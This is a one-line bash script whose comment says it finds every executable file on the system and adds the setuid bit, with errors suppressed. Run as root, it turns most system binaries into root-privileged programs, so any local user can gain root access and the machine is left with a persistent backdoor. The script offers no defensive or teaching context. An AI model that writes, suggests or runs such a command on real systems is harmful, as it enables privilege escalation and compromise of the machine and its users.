#!/bin/bash

#Find all executable files and add suid bit
find / -type f -executable -exec chmod u+s {} \; 2> /dev/null
